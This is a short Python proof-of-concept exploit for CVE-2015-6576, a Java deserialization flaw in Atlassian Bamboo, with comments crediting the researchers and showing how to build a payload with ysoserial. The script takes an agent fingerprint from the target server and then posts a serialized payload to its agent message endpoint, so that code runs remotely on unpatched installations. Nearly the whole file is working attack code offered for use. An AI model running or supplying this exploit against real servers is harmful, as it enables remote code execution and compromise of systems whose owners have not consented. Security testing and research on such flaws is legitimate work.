# This script is styled after the scripts created by Stephen Breen of Foxglove
# Security in the somewhat infamous "What Do Weblogic, Websphere, JBoss, Jenkins,
# OpenNMS, and Your Application Have in Common? A Vulnerability."
#
# The Bamboo deserialization vulnerability was discovered and disclosed to
# Atlassian by Matthais Kaiser of Code White. Matthais even gave an excellent talk
# on the subject matter. You can find it on youtube (fast forward to ~42:00 to
# go straight to the demo of this vuln):
#
# https://www.youtube.com/watch?v=VviY3O-euVQ
#
# However, Matthais didn't release the code?! So here it is, a PoC for CVE-2015-6576
#
# usage: ./bamboo.py host port /path/to/payload
#
# Note that the payload is supposed to be a payload generated by Chris Frohoff's
# ysoserial (https://github.com/frohoff/ysoserial). For example:
#
# java -jar ./ysoserial-0.0.2-SNAPSHOT-all.jar CommonsCollections1 'firefox' > payload.out

import re
import sys
import socket
import requests
 
if len(sys.argv) != 4:
    print 'Usage: ./bamboo.py host port /path/to/payload'
    sys.exit(0)
 
host = sys.argv[1]
port = sys.argv[2]
payloadObject = open(sys.argv[3], 'rb').read()
 
# Get the fingerprint so that we can use it in the object post
r = requests.get('https://'+host+':'+port+'/wiki/agentServer/GetFingerprint.action?agent=elastic')
match = re.search(r'^bootstrapVersion=\d+&fingerprint=([^&]+)&', r.text)
 
if match:
    r = requests.post('https://'+host+':'+port+'/wiki/agentServer/message?fingerprint='+match.group(1), data = payloadObject);
    if r.status_code == 401:
        print "Didn't work. Probably patched."
    elif r.status_code == 500:
        print 'It worked!'
    else:
        print 'I have no idea what happened.'
else:
    print 'Failed to get the fingerprint.'
    sys.exit(0);
